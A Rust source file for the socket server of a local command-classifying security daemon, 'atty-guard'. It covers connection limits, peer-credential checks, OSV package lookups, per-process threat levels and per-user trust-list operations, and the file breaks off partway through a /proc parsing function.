//! UDS server — accept loop + per-connection thread.
//!
//! Protocol: JSON-line. One request per `\n`-terminated line, one
//! response per `\n`-terminated line. Connections persist across
//! requests so atty can keep a single open socket per session.
//!
//! No tokio — keeping deps minimal. Thread-per-connection is fine
//! at the expected scale (one atty session ≈ one or two open
//! connections at most).

use crate::classifier::Classifier;
use crate::protocol::{
    Category, ClassifyContext, ClassifyResult, Envelope, Request, ResponseBody, ThreatLevel,
    Verdict,
};
use crate::threat_map::ThreatMap;
use std::io::{BufRead, BufReader, Read, Write};
use std::os::unix::net::{UnixListener, UnixStream};
use std::path::Path;
use std::sync::Arc;
use std::thread;

/// Hard cap on a single request line. Anything longer is treated
/// as a hostile / buggy client and the connection is dropped. 64
/// KiB is well beyond any plausible typed command + context blob;
/// keeps a malicious local app from OOM'ing the daemon by streaming
/// an unbounded "line" past serde_json's recursion limit.
const MAX_LINE_BYTES: u64 = 64 * 1024;

pub fn serve(
    socket: &Path,
    verbosity: u8,
    // Caller-built classifier — gpt-review #026 moves backend
    // construction into main.rs so it can choose between fail-loud
    // (operator explicitly requested ONNX) and fall-back-to-stub
    // (default path) per BackendSource. serve() stays agnostic.
    classifier: Classifier,
    ebpf: Option<Arc<crate::ebpf::EbpfState>>,
    osv: Option<Arc<crate::osv::OsvClient>>,
    trust_store: Arc<crate::trust_store::TrustStore>,
    server_cfg: crate::config::ServerConfig,
) -> std::io::Result<()> {
    let listener = UnixListener::bind(socket)?;
    // Socket perms: owner (the daemon's `atty` user) read+write, group
    // (the `atty` system group, which user accounts are added to via
    // `sudo usermod -aG atty $USER`) read+write so atty proxies can
    // connect, others nothing. UDS files honour file permissions on
    // Linux; mode 0660 keeps the threat model intact (co-tenant users
    // NOT in the `atty` group can't connect) while letting the
    // group-permission path work as documented.
    //
    // Pre-#140 the daemon ran as the same user as the atty proxy,
    // so 0600 was correct then — both ends shared owner. Post-#140
    // the daemon runs as `atty` and proxies run as `$USER`, so
    // group-readable is the only way for the connection to work
    // without world-readability.
    //
    // For dev runs as a regular user (--socket /tmp/...), the file
    // ends up `$USER:$USER` 0660; nothing else can connect, which is
    // also what we want.
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(socket, std::fs::Permissions::from_mode(0o660))?;

    let mut threat = ThreatMap::new();
    if let Some(es) = ebpf {
        threat = threat.with_ebpf(es);
    }

    let state = Arc::new(State {
        classifier,
        threat,
        verbosity,
        trust_store,
        osv,
    });

    // Bounded-resources gate: shared atomic counter ticks up on
    // accept (per spawned handler thread) and back down via the
    // RAII `ConnGuard` when the handler returns. New connections
    // beyond the cap are dropped immediately so a buggy / hostile
    // local process can't pile up idle threads.
    let in_flight = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    // Clamp cap to 1 if an operator misconfigured it to 0 (which
    // would otherwise reject every connection, silently bricking
    // the daemon). Print a stderr warning so the misconfig is
    // discoverable rather than invisible.
    let max_conn = if server_cfg.max_concurrent_connections == 0 {
        eprintln!(
            "atty-guard: max_concurrent_connections=0 is a misconfig — clamping to 1"
        );
        1
    } else {
        server_cfg.max_concurrent_connections
    };
    let read_timeout = if server_cfg.idle_read_timeout_secs > 0 {
        Some(std::time::Duration::from_secs(server_cfg.idle_read_timeout_secs))
    } else {
        None
    };

    for stream in listener.incoming() {
        let stream = match stream {
            Ok(s) => s,
            Err(e) => {
                eprintln!("atty-guard: accept failed: {e}");
                continue;
            }
        };

        // Atomically test-and-increment against the cap. If we'd
        // exceed it, drop the connection immediately — the
        // client sees a fast EOF rather than queueing indefinitely.
        let prev = in_flight.fetch_add(1, std::sync::atomic::Ordering::AcqRel);
        if prev >= max_conn {
            in_flight.fetch_sub(1, std::sync::atomic::Ordering::AcqRel);
            if verbosity >= 1 {
                eprintln!(
                    "atty-guard: rejecting connection — already at cap of {max_conn} in-flight"
                );
            }
            // Explicit `shutdown(Both)` ahead of `drop` so the
            // client observes EOF promptly. The bare `drop`
            // would close the fd too, but the kernel can
            // briefly hold the close before the peer wakes from
            // its `read`; calling shutdown explicitly forces an
            // immediate end-of-stream the peer sees as Ok(0).
            let _ = stream.shutdown(std::net::Shutdown::Both);
            drop(stream);
            continue;
        }

        // Apply the read timeout so an idle client holding a
        // connection without sending anything can't squat on a
        // handler thread forever.
        if let Some(t) = read_timeout {
            if let Err(e) = stream.set_read_timeout(Some(t)) {
                eprintln!("atty-guard: set_read_timeout failed: {e}");
            }
        }

        let state = state.clone();
        let in_flight = in_flight.clone();
        thread::spawn(move || {
            // ConnGuard decrements on drop so the slot is freed
            // whether the handler returns Ok, Err, or panics.
            let _guard = ConnGuard {
                counter: in_flight,
            };
            if let Err(e) = handle(stream, state) {
                eprintln!("atty-guard: connection error: {e}");
            }
        });
    }
    Ok(())
}

/// RAII slot release for the in-flight counter. Drop runs even
/// on panic (handler thread cleanup), guaranteeing the slot
/// frees up so a panicked connection doesn't leak capacity.
struct ConnGuard {
    counter: Arc<std::sync::atomic::AtomicUsize>,
}
impl Drop for ConnGuard {
    fn drop(&mut self) {
        self.counter
            .fetch_sub(1, std::sync::atomic::Ordering::AcqRel);
    }
}

struct State {
    classifier: Classifier,
    threat: ThreatMap,
    verbosity: u8,
    /// Optional V2-F live OSV.dev client. When present, the
    /// classify dispatch runs an OSV lookup AFTER Tier-1's local
    /// flagged-package list misses but the command IS an
    /// `npm install <pkg>` shape — closes the gap between
    /// "atty-guard ships a curated bad-list" and "actual OSV
    /// disclosures land before atty-guard's next release".
    osv: Option<Arc<crate::osv::OsvClient>>,
    /// PR #141 — per-UID atom + URL trust state. Mutating
    /// dispatch arms gate on connecting client's EUID via
    /// SO_PEERCRED (`PeerCred` below).
    trust_store: Arc<crate::trust_store::TrustStore>,
}

/// Peer credentials read from the UDS via SO_PEERCRED at accept
/// time. Carried by the connection-handler so each request's
/// dispatch can check the caller's UID/EUID without re-reading.
#[derive(Debug, Clone, Copy)]
struct PeerCred {
    uid: u32,
    is_root: bool,
}

impl PeerCred {
    fn from_stream(stream: &UnixStream) -> std::io::Result<Self> {
        // SO_PEERCRED on Linux returns the connecting process's
        // pid/uid/gid at connect time. Per `socket(7)`: "The
        // credentials returned to the listening process correspond
        // to the credentials of the peer process at the time of
        // call to connect()". Good enough for our threat model —
        // a SUID binary that drops privs before connecting would
        // appear root-credentialled, but that's an explicit choice
        // of the calling binary author. Standard `sudo atty-guard
        // ...` runs the CLI binary post-credential-set, so EUID 0
        // at connect = sudo'd invocation.
        //
        // `UnixStream::peer_cred()` is still unstable as of Rust
        // 1.82 (issue #42839), so we go straight to getsockopt
        // SO_PEERCRED via libc. The wire format is `struct ucred {
        // pid_t pid; uid_t uid; gid_t gid }` — three u32s on Linux.
        use std::os::fd::AsRawFd;

        #[repr(C)]
        struct Ucred {
            pid: i32,
            uid: u32,
            gid: u32,
        }
        // Linux ABI: SOL_SOCKET=1, SO_PEERCRED=17. socklen_t is
        // typedef'd to `unsigned int` (u32) on all glibc/musl
        // targets we ship to; aliasing to u32 here matches the
        // libc crate's definition for our supported triples.
        type SocklenT = u32;
        const SOL_SOCKET: i32 = 1;
        const SO_PEERCRED: i32 = 17;

        extern "C" {
            fn getsockopt(
                sockfd: i32,
                level: i32,
                optname: i32,
                optval: *mut std::ffi::c_void,
                optlen: *mut SocklenT,
            ) -> i32;
        }

        let fd = stream.as_raw_fd();
        let mut cred = Ucred {
            pid: 0,
            uid: u32::MAX,
            gid: u32::MAX,
        };
        let mut len = std::mem::size_of::<Ucred>() as SocklenT;
        let rc = unsafe {
            getsockopt(
                fd,
                SOL_SOCKET,
                SO_PEERCRED,
                &mut cred as *mut Ucred as *mut std::ffi::c_void,
                &mut len,
            )
        };
        if rc != 0 {
            // getsockopt failed; errno is meaningful here.
            return Err(std::io::Error::last_os_error());
        }
        if len != std::mem::size_of::<Ucred>() as SocklenT {
            // Short read — kernel returned success but a smaller
            // struct than we expect. Treat as a hard error since
            // we can't trust partial credentials. errno isn't
            // set in this path, so build a synthetic error.
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                format!(
                    "SO_PEERCRED returned {} bytes, expected {}",
                    len,
                    std::mem::size_of::<Ucred>()
                ),
            ));
        }
        Ok(Self {
            uid: cred.uid,
            is_root: cred.uid == 0,
        })
    }
}

fn handle(stream: UnixStream, state: Arc<State>) -> std::io::Result<()> {
    let peer = PeerCred::from_stream(&stream)?;
    if state.verbosity >= 2 {
        eprintln!("atty-guard: peer uid={} root={}", peer.uid, peer.is_root);
    }
    let mut reader = BufReader::new(stream.try_clone()?);
    let mut writer = stream;
    let mut line_buf = String::new();

    loop {
        line_buf.clear();
        // Cap the read so a hostile client can't stream an
        // unbounded "line" until OOM. take(N).read_line bounds the
        // String capacity to N bytes; we treat overflow as
        // "drop the connection" rather than truncating the line
        // and feeding garbled JSON to the parser.
        let mut limited = (&mut reader).take(MAX_LINE_BYTES);
        let n = limited.read_line(&mut line_buf)?;
        if n == 0 {
            break;
        }
        if n as u64 == MAX_LINE_BYTES && !line_buf.ends_with('\n') {
            write_response(
                &mut writer,
                0,
                ResponseBody::Error {
                    message: "request line exceeds 64 KiB limit".into(),
                },
            )?;
            break;
        }
        let trimmed = line_buf.trim();
        if trimmed.is_empty() {
            continue;
        }
        let envelope: serde_json::Value = match serde_json::from_str(trimmed) {
            Ok(v) => v,
            Err(e) => {
                write_response(
                    &mut writer,
                    0,
                    ResponseBody::Error {
                        message: format!("invalid JSON: {e}"),
                    },
                )?;
                continue;
            }
        };

        let id = envelope.get("id").and_then(|v| v.as_u64()).unwrap_or(0);
        if state.verbosity >= 2 {
            // Redact the payload: log only method + id + byte
            // count. Full payload would dump typed command lines,
            // trust hashes, and URL allow/block decisions to
            // journald, where anyone in `systemd-journal` group
            // can read them. The threat model says atty IS the
            // endpoint — verbose payload logging would violate it.
            let method = envelope
                .get("method")
                .and_then(|v| v.as_str())
                .unwrap_or("?");
            eprintln!(
                "atty-guard: <- method={method} id={id} bytes={}",
                trimmed.len()
            );
        }
        let request: Request = match serde_json::from_value(envelope.clone()) {
            Ok(r) => r,
            Err(e) => {
                write_response(
                    &mut writer,
                    id,
                    ResponseBody::Error {
                        message: format!("invalid request: {e}"),
                    },
                )?;
                continue;
            }
        };

        let response = dispatch(&state, request, peer);
        if state.verbosity >= 2 {
            eprintln!("atty-guard: -> id={id} {response:?}");
        }
        write_response(&mut writer, id, response)?;
    }
    Ok(())
}

fn dispatch(state: &State, req: Request, peer: PeerCred) -> ResponseBody {
    use crate::protocol::{AtomScope, UrlDecisionEntry};
    use crate::trust_store::{ListScope, UrlDecision};
    match req {
        Request::Health => ResponseBody::Health {
            version: env!("CARGO_PKG_VERSION").to_owned(),
        },
        Request::Classify { command, context } => {
            // Tier-1 (and Tier-2 stub) classification.
            let mut result = state.classifier.classify(&command);

            // PR #141 — per-UID atom overlay. Persistent atoms
            // (from `atoms add`) + session atoms (from the proxy's
            // `[A]llow always` taps — PR #142 wires the proxy side)
            // get checked as substrings. A hit upgrades a Safe
            // verdict to Warn; existing Warn/Block are left alone
            // (no point fighting V2-J's accumulator with a single
            // overlay hit).
            //
            // Substring scan rather than a per-UID AC automaton is
            // an explicit trade-off: the overlay is typically
            // dozens of atoms per user, AC build cost would dwarf
            // the scan savings. Re-evaluate if a user's overlay
            // grows past ~100 atoms (none today).
            if matches!(result.verdict, Verdict::Safe) {
                // ensure_loaded is a no-op after first call per UID
                // per daemon lifetime — keeps the hot path off disk.
                // Mutations re-load the cache directly. System-
                // fetched is a separate one-shot init that runs
                // once per daemon lifetime; explicit reload happens
                // on SIGHUP / after the fetcher thread writes.
                let _ = state.trust_store.ensure_loaded(peer.uid);
                state.trust_store.ensure_system_fetched_loaded();
                let system_fetched = state.trust_store.list_system_fetched();
                let overlay_persistent = state.trust_store.list_atoms(
                    peer.uid,
                    crate::trust_store::ListScope::Persistent,
                );
                let overlay_session = state.trust_store.list_atoms(
                    peer.uid,
                    crate::trust_store::ListScope::Session,
                );
                // Scan order: system-fetched (shared, daemon-managed)
                // → user persistent (per-UID, sudo-mediated) → user
                // session (per-UID, banner-driven). First-match-wins;
                // each branch labels its own `reason` so the operator
                // sees which scope fired (helps debug "why is this
                // command being flagged?").
                let mut hit: Option<(&'static str, String)> = None;
                for atom in system_fetched.iter() {
                    if command.contains(atom.as_str()) {
                        hit = Some(("system-fetched", atom.clone()));
                        break;
                    }
                }
                if hit.is_none() {
                    for atom in overlay_persistent.iter() {
                        if command.contains(atom.as_str()) {
                            hit = Some(("user-persistent", atom.clone()));
                            break;
                        }
                    }
                }
                if hit.is_none() {
                    for atom in overlay_session.iter() {
                        if command.contains(atom.as_str()) {
                            hit = Some(("user-session", atom.clone()));
                            break;
                        }
                    }
                }
                if let Some((scope, atom)) = hit {
                    result = ClassifyResult {
                        verdict: Verdict::Warn,
                        category: Category::None,
                        confidence: 0.6,
                        reason: format!("{scope} atom matched: `{atom}`"),
                        matched: atom,
                    };
                }
            }

            // V2-F live OSV lookup. Runs only when Tier-1 said Safe
            // AND the command is an `npm install <pkg>` shape AND
            // the daemon was started with --enable-osv. Catches
            // packages that landed on OSV's advisory list AFTER
            // atty-guard's last bundled-data update.
            //
            // Walks every parsed package token (not just the first)
            // to defeat the prepend-a-benign-pkg attacker bypass,
            // and keeps the strictest verdict via
            // `verdict_strictly_worse` so a Malicious (Block) pkg
            // after a Vulnerable (Warn) pkg isn't lost to an early
            // first-non-Safe exit. Short-circuit only on Block —
            // the strictest possible outcome; further OSV calls
            // can't escalate further.
            if matches!(result.verdict, Verdict::Safe) {
                if let Some(osv) = &state.osv {
                    for pkg in crate::npm_parser::extract_npm_install_pkgs(&command) {
                        match osv.lookup_npm(pkg) {
                            Ok(verdict) => {
                                if let Some(r) = crate::osv::osv_verdict_to_result(verdict, pkg) {
                                    if verdict_strictly_worse(&result.verdict, &r.verdict) {
                                        result = r;
                                    }
                                    if matches!(result.verdict, Verdict::Block) {
                                        break;
                                    }
                                }
                            }
                            Err(e) => {
                                if state.verbosity >= 2 {
                                    eprintln!("atty-guard: OSV lookup failed for {pkg}: {e}");
                                }
                            }
                        }
                    }
                }
            }

            // Threat-map upgrade: a PID already marked High/Critical
            // by an earlier command can escalate the verdict for the
            // CURRENT command. Worst-wins via verdict_strictly_worse
            // so a Critical-marked PID with an existing atom-overlay
            // Warn becomes Block (the strictest signal wins), not
            // a stuck Warn — same invariant the OSV multi-package
            // loop above relies on. Without this, the prior shape
            // gated on `result.verdict == Safe` and silently lost
            // Critical→Block escalation when ANY upstream signal
            // had already nudged Safe to Warn.
            if let ClassifyContext { pid: Some(pid), .. } = context {
                let level = state.threat.get(pid);
                if matches!(level, ThreatLevel::High | ThreatLevel::Critical) {
                    let candidate = ClassifyResult {
                        verdict: if matches!(level, ThreatLevel::Critical) {
                            Verdict::Block
                        } else {
                            Verdict::Warn
                        },
                        category: Category::PidHighThreat,
                        confidence: 1.0,
                        reason:
                            "this PID's process tree was marked high-risk by an earlier command"
                                .into(),
                        matched: command.clone(),
                    };
                    if verdict_strictly_worse(&result.verdict, &candidate.verdict) {
                        result = candidate;
                    }
                }
            }

            ResponseBody::Classify(result)
        }
        Request::SetThreatLevel { pid, level } => {
            // SetThreatLevel can promote a PID into the eBPF
            // threat_map (when V2-B is enabled), and a Critical
            // level forces later classifies for that PID's tree to
            // Block. Because the socket is group-accessible (0660
            // + the `atty` group), any same-group client could
            // otherwise mark another user's PID — a cross-user
            // DoS / privilege violation. Gate: root may set any
            // PID; a non-root caller may set only PIDs owned by
            // their own UID. PID reuse: ThreatMap stores the PID's
            // starttime alongside the level so a later `get` can
            // detect recycled PIDs and evict the stale entry — see
            // `ThreatMap::set` / `get`.
            // Identity validated by the non-root + non-Low gate
            // gets passed straight into ThreatMap so the map's
            // commit uses the same (pid, starttime) the gate
            // authorized — closes the residual TOCTOU window
            // between the gate's read and the map's internal read.
            let mut validated_starttime: Option<u64> = None;
            if !peer.is_root && !matches!(level, ThreatLevel::Low) {
                // TOCTOU defense: read starttime BEFORE the
                // ownership check and AGAIN AFTER, and reject if
                // they differ. Otherwise an attacker could win
                // the race between `pid_owner_uid` (sees the old
                // process, owned by attacker's UID) and a later
                // /proc read (sees a recycled PID now owned by a
                // different user) — installing a non-Low mark +
                // BPF entry against someone else's process.
                // Identity = (pid, starttime) on Linux within one
                // boot.
                let start1 = match crate::threat_map::pid_starttime(pid) {
                    crate::threat_map::ProcRead::Found(t) => t,
                    crate::threat_map::ProcRead::NotFound => {
                        return ResponseBody::Error {
                            message: format!(
                                "pid {pid} no longer exists — cannot set non-Low threat level"
                            ),
                        };
                    }
                    crate::threat_map::ProcRead::Error(msg) => {
                        return ResponseBody::Error { message: msg };
                    }
                };
                match pid_owner_uid(pid) {
                    OwnerLookup::Owner(owner_uid) if owner_uid != peer.uid => {
                        return ResponseBody::Error {
                            message: format!(
                                "non-root caller (uid {}) cannot set threat level for pid {pid} (owned by uid {owner_uid})",
                                peer.uid
                            ),
                        };
                    }
                    OwnerLookup::NotFound => {
                        return ResponseBody::Error {
                            message: format!(
                                "pid {pid} no longer exists — cannot set non-Low threat level"
                            ),
                        };
                    }
                    OwnerLookup::Error(msg) => {
                        return ResponseBody::Error { message: msg };
                    }
                    OwnerLookup::Owner(_) => {}
                }
                let start2 = match crate::threat_map::pid_starttime(pid) {
                    crate::threat_map::ProcRead::Found(t) => t,
                    crate::threat_map::ProcRead::NotFound => {
                        return ResponseBody::Error {
                            message: format!("pid {pid} disappeared mid-request"),
                        };
                    }
                    crate::threat_map::ProcRead::Error(msg) => {
                        return ResponseBody::Error { message: msg };
                    }
                };
                if start1 != start2 {
                    return ResponseBody::Error {
                        message: format!(
                            "pid {pid} was recycled mid-request — refusing to set threat level"
                        ),
                    };
                }
                validated_starttime = Some(start2);
            } else if !peer.is_root {
                // Non-root + Low: pure eviction. Permit even when
                // the PID is gone; reject only when the ownership
                // lookup itself fails or returns a different live
                // UID (clearing someone else's live mark would
                // still be a cross-user policy violation).
                match pid_owner_uid(pid) {
                    OwnerLookup::Owner(owner_uid) if owner_uid != peer.uid => {
                        return ResponseBody::Error {
                            message: format!(
                                "non-root caller (uid {}) cannot clear threat level for pid {pid} (owned by uid {owner_uid})",
                                peer.uid
                            ),
                        };
                    }
                    OwnerLookup::Error(msg) => {
                        return ResponseBody::Error { message: msg };
                    }
                    OwnerLookup::Owner(_) | OwnerLookup::NotFound => {}
                }
            }
            // Use the validated starttime when we have one so the
            // map's commit can't race against PID recycling
            // between the gate and the map's own /proc read. Other
            // paths (root, Low) fall through to `set` which reads
            // starttime internally; those paths don't carry the
            // cross-user gate that needed the lock-step identity.
            match validated_starttime {
                Some(start) => {
                    state.threat.set_with_starttime(pid, level, start);
                    ResponseBody::Ok
                }
                None => {
                    if !state.threat.set(pid, level) {
                        return ResponseBody::Error {
                            message: format!(
                                "unable to read /proc/{pid}/stat (pid may have exited) — threat level not set"
                            ),
                        };
                    }
                    ResponseBody::Ok
                }
            }
        }
        Request::GetThreatLevel { pid } => {
            // Gate cross-UID reads the same way SetThreatLevel gates
            // cross-UID writes: without this, any same-host caller
            // can probe arbitrary PIDs and learn whether they're
            // marked High/Critical — a cross-tenant info leak on
            // multi-user systems. Root reads everything; non-root
            // sees only its own PIDs. NotFound (already-dead PID)
            // is allowed since the threat level is just an in-memory
            // value with no useful signal for an exited process.
            //
            // Error case (e.g. hidepid=2 hiding /proc/<pid>/status,
            // or a transient read failure) is rejected — without
            // this, the same probing attack would succeed whenever
            // pid_owner_uid couldn't decide. Mirrors SetThreatLevel's
            // shape exactly so the read gate doesn't lag the write
            // gate.
            if !peer.is_root {
                match pid_owner_uid(pid) {
                    OwnerLookup::Owner(owner_uid) if owner_uid != peer.uid => {
                        return ResponseBody::Error {
                            message: format!(
                                "non-root caller (uid {}) cannot read threat level for pid {pid} (owned by uid {owner_uid})",
                                peer.uid
                            ),
                        };
                    }
                    OwnerLookup::Error(msg) => {
                        return ResponseBody::Error { message: msg };
                    }
                    OwnerLookup::Owner(_) | OwnerLookup::NotFound => {}
                }
            }
            ResponseBody::ThreatLevel {
                level: state.threat.get(pid),
            }
        }

        // --- PR #141 mediated trust-state ops ---
        Request::AtomsAdd {
            pattern,
            target_uid,
        } => {
            if !peer.is_root {
                return require_root_error("atoms add");
            }
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            match state.trust_store.persistent_add_atom(uid, &pattern) {
                Ok(()) => ResponseBody::Ok,
                Err(e) => ResponseBody::Error {
                    message: e.to_string(),
                },
            }
        }
        Request::AtomsRemove {
            pattern,
            target_uid,
        } => {
            if !peer.is_root {
                return require_root_error("atoms remove");
            }
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            match state.trust_store.persistent_remove_atom(uid, &pattern) {
                Ok(true) => ResponseBody::Ok,
                Ok(false) => ResponseBody::Error {
                    message: format!("atom not present: `{pattern}`"),
                },
                Err(e) => ResponseBody::Error {
                    message: e.to_string(),
                },
            }
        }
        Request::AtomsList { scope, target_uid } => {
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            match scope {
                AtomScope::System => ResponseBody::AtomsList {
                    atoms: state.classifier.system_atoms_snapshot(),
                },
                AtomScope::Fetched => {
                    // GPT-review #023: expose the runtime-fetched
                    // corpus separately so operators chasing a
                    // `system-fetched atom matched: <atom>` reason
                    // can verify which atom triggered. Lazy-load
                    // first so a fresh daemon that hasn't run its
                    // classify-hot-path lazy-init yet still returns
                    // a populated list.
                    state.trust_store.ensure_system_fetched_loaded();
                    let arc = state.trust_store.list_system_fetched();
                    ResponseBody::AtomsList {
                        atoms: arc.as_ref().clone(),
                    }
                }
                AtomScope::User => {
                    let _ = state.trust_store.ensure_loaded(uid);
                    ResponseBody::AtomsList {
                        atoms: state.trust_store.list_atoms(uid, ListScope::Persistent),
                    }
                }
                AtomScope::Session => ResponseBody::AtomsList {
                    atoms: state.trust_store.list_atoms(uid, ListScope::Session),
                },
            }
        }
        Request::AtomsDrift => match crate::atom_drift::read_snapshot(std::path::Path::new(
            crate::atom_drift::DEFAULT_DRIFT_FILE,
        )) {
            Ok(Some(snapshot)) => ResponseBody::AtomsDrift {
                available: true,
                updated_at: Some(snapshot.updated_at),
                sources: snapshot
                    .sources
                    .into_iter()
                    .map(|s| crate::protocol::DriftEntry {
                        name: s.name,
                        pinned: s.pinned,
                        upstream: s.upstream,
                        behind_since: s.behind_since,
                    })
                    .collect(),
            },
            Ok(None) => ResponseBody::AtomsDrift {
                available: false,
                updated_at: None,
                sources: Vec::new(),
            },
            Err(e) => ResponseBody::Error {
                message: format!("drift snapshot unreadable: {e}"),
            },
        },
        Request::UrlsAllow { host, target_uid } => {
            if !peer.is_root {
                return require_root_error("urls allow");
            }
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            match state
                .trust_store
                .persistent_add_url(uid, &host, UrlDecision::Allow)
            {
                Ok(()) => ResponseBody::Ok,
                Err(e) => ResponseBody::Error {
                    message: e.to_string(),
                },
            }
        }
        Request::UrlsBlock { host, target_uid } => {
            if !peer.is_root {
                return require_root_error("urls block");
            }
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            match state
                .trust_store
                .persistent_add_url(uid, &host, UrlDecision::Block)
            {
                Ok(()) => ResponseBody::Ok,
                Err(e) => ResponseBody::Error {
                    message: e.to_string(),
                },
            }
        }
        Request::UrlsList { target_uid } => {
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            let _ = state.trust_store.ensure_loaded(uid);
            let entries: Vec<UrlDecisionEntry> = state
                .trust_store
                .list_urls(uid)
                .into_iter()
                .map(|(host, dec)| UrlDecisionEntry {
                    host,
                    decision: dec.as_wire_str().to_owned(),
                })
                .collect();
            ResponseBody::UrlsList { entries }
        }
        Request::SessionList { target_uid } => {
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            let (atoms, urls_allow, urls_block, trust) =
                state.trust_store.session_summary(uid);
            ResponseBody::SessionList {
                atoms,
                urls_allow,
                urls_block,
                trust,
            }
        }
        Request::SessionClear { target_uid } => {
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            state.trust_store.session_clear(uid);
            ResponseBody::Ok
        }
        Request::SessionAddTrust { hash, target_uid } => {
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            match state.trust_store.session_add_trust(uid, &hash) {
                Ok(()) => ResponseBody::Ok,
                Err(e) => ResponseBody::Error { message: e },
            }
        }
        Request::SessionAddUrlBlock { host, target_uid } => {
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            match state.trust_store.session_add_url_block(uid, &host) {
                Ok(()) => ResponseBody::Ok,
                Err(e) => ResponseBody::Error { message: e },
            }
        }
        Request::TrustAdd { hash, target_uid } => {
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            match state.trust_store.persistent_add_trust(uid, &hash) {
                Ok(()) => ResponseBody::Ok,
                Err(e) => ResponseBody::Error {
                    message: e.to_string(),
                },
            }
        }
        Request::TrustList { target_uid } => {
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            let _ = state.trust_store.ensure_loaded(uid);
            ResponseBody::TrustList {
                trust: state.trust_store.list_persistent_trust(uid),
            }
        }
        Request::SessionWrite { target_uid } => {
            if !peer.is_root {
                return require_root_error("session write");
            }
            let uid = match resolve_target_uid(peer, target_uid) {
                Ok(u) => u,
                Err(msg) => return ResponseBody::Error { message: msg },
            };
            match state.trust_store.session_write(uid) {
                Ok(report) => {
                    if state.verbosity >= 1 {
                        eprintln!(
                            "atty-guard: session write uid={} atoms={} allow={} block={} \
                             trust={} invalid={} not_persisted={}",
                            uid,
                            report.atoms_added,
                            report.urls_allow_added,
                            report.urls_block_added,
                            report.trust_added,
                            report.invalid.len(),
                            report.not_persisted.len(),
                        );
                    }
                    // Surface BOTH the invalid AND not_persisted
                    // lists to the CLI via a structured error so the
                    // operator sees exactly which entries stayed in
                    // session AND why — malformed entries need
                    // fixing, cap-blocked entries need the trust
                    // file pruned and a retry (GPT-review #025).
                    if report.invalid.is_empty() && report.not_persisted.is_empty() {
                        ResponseBody::Ok
                    } else {
                        let mut sections: Vec<String> = Vec::new();
                        if !report.invalid.is_empty() {
                            let lines: Vec<String> = report
                                .invalid
                                .iter()
                                .map(|(e, r)| format!("  `{e}` — {r}"))
                                .collect();
                            sections.push(format!(
                                "kept {} invalid entr{} in session for review:\n{}",
                                report.invalid.len(),
                                if report.invalid.len() == 1 { "y" } else { "ies" },
                                lines.join("\n"),
                            ));
                        }
                        if !report.not_persisted.is_empty() {
                            let lines: Vec<String> = report
                                .not_persisted
                                .iter()
                                .map(|(e, r)| format!("  `{e}` — {r}"))
                                .collect();
                            sections.push(format!(
                                "kept {} valid entr{} in session for retry (resolve the \
                                 cause, then re-run `session write`):\n{}",
                                report.not_persisted.len(),
                                if report.not_persisted.len() == 1 { "y" } else { "ies" },
                                lines.join("\n"),
                            ));
                        }
                        ResponseBody::Error {
                            message: format!(
                                "session write partial — atoms={} allow={} block={} \
                                 trust={}\n{}",
                                report.atoms_added,
                                report.urls_allow_added,
                                report.urls_block_added,
                                report.trust_added,
                                sections.join("\n"),
                            ),
                        }
                    }
                }
                Err(e) => ResponseBody::Error {
                    message: e.to_string(),
                },
            }
        }
    }
}

/// Resolve the UID to operate on. If `target_uid` is None or
/// matches the peer's own UID, use peer.uid. Non-root callers can't
/// target another UID — this prevents a regular user from poking
/// into root's (or another user's) atom set via a forged request.
fn resolve_target_uid(peer: PeerCred, target_uid: Option<u32>) -> Result<u32, String> {
    match target_uid {
        None => Ok(peer.uid),
        Some(t) if t == peer.uid => Ok(t),
        Some(t) if peer.is_root => Ok(t),
        Some(t) => Err(format!(
            "non-root caller (uid {}) cannot target a different uid (requested {t})",
            peer.uid
        )),
    }
}

/// Outcome of looking up the owning UID for a PID. `NotFound`
/// distinguishes "the PID is gone" from "the lookup itself failed
/// for some other reason" (hidepid, transient I/O, malformed
/// proc) so callers can authorize Low (pure-eviction) requests on
/// NotFound without weakening the gate for live cross-user PIDs.
enum OwnerLookup {
    Owner(u32),
    NotFound,
    Error(String),
}

/// Return the real UID that owns `pid` by parsing `/proc/<pid>/status`.
/// Used to gate `SetThreatLevel` so a non-root caller can't mark
/// another user's PID. Returns `NotFound` when the PID is gone
/// (`ENOENT`), `Error` for any other read/parse failure, and
/// `Owner(uid)` on success.
///
/// We parse the `Uid:` line (per `proc(5)`:
/// `Uid:\treal\teffective\tsaved\tfsuid`) and take the FIRST
/// whitespace-separated field after the `Uid:` prefix — that's
/// the REAL uid. Real (not effective) is the right call: a
/// setuid-root helper that drops privs and connects would
/// otherwise be able to mark anything; pinning on the real uid
/// matches `task->real_cred` ownership semantics that users mean
/// by "my process".
fn pid_owner_uid(pid: u32) -> OwnerLookup {
    let path = format!("/proc/{pid}/status");
    let content = match std::fs::read_to_string(&path) {
        Ok(c) => c,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return OwnerLookup::NotFound,
